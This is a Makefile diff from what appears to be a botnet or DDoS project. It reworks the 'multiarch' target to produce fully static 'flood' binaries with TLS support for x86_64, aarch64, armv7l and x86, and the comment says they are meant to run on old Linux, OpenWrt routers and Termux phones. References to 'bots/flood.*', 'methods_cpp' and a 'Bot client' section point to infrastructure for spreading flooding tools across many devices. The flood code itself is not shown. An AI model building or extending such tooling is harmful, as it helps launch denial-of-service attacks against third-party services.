@@ -34,18 +34,18 @@ flood-native: flood.cpp
 		&& echo "[+] flood (no TLS) OK" ) )
 
 # -----------------------------------------------------------------------
-# Multi-arch static builds via Zig (L4 only — no SSL/nghttp2 in musl static)
+# Multi-arch FULLY-STATIC flood binaries (musl + OpenSSL TLS) — run on any
+# Linux device (old glibc, Alpine, OpenWrt, Termux). Built via
+# methods_cpp/Makefile (rewrites bots/flood.* with the static ones).
 # -----------------------------------------------------------------------
-multiarch: flood.cpp
-	@if [ -x "$(ZIG)" ]; then \
-		echo "[*] Building multi-arch static flood binaries..."; \
-		$(ZIG) c++ -target x86_64-linux-musl  -mcpu=x86_64 $(ZIG_CXXFLAGS) flood.cpp -o flood-x86_64  && echo "[+] flood-x86_64 OK"; \
-		$(ZIG) c++ -target aarch64-linux-musl            $(ZIG_CXXFLAGS) flood.cpp -o flood-aarch64 && echo "[+] flood-aarch64 OK"; \
-		$(ZIG) c++ -target arm-linux-musleabihf -mcpu=cortex_a7 $(ZIG_CXXFLAGS) flood.cpp -o flood-armv7l && echo "[+] flood-armv7l OK"; \
-		$(ZIG) c++ -target x86-linux-musl                $(ZIG_CXXFLAGS) flood.cpp -o flood-x86  && echo "[+] flood-x86 OK"; \
-	else \
-		echo "[!] Zig not found at $(ZIG), skipping multi-arch build"; \
-	fi
+multiarch:
+	@echo "[*] Building fully-static multi-arch flood binaries (via methods_cpp)..."
+	@$(MAKE) -C "../methods_cpp" static ZIG="$(ZIG)"
+	@cp -f ../methods_cpp/flood-x86_64  flood-x86_64  && echo "[+] flood-x86_64 OK"
+	@cp -f ../methods_cpp/flood-aarch64 flood-aarch64 && echo "[+] flood-aarch64 OK"
+	@cp -f ../methods_cpp/flood-armv7l  flood-armv7l  && echo "[+] flood-armv7l OK"
+	@cp -f ../methods_cpp/flood-x86     flood-x86     && echo "[+] flood-x86 OK"
+	@cp -f ../methods_cpp/flood-x86_64  flood          && echo "[+] flood (static x86_64) OK"
 
 # -----------------------------------------------------------------------
 # Bot client (unchanged)
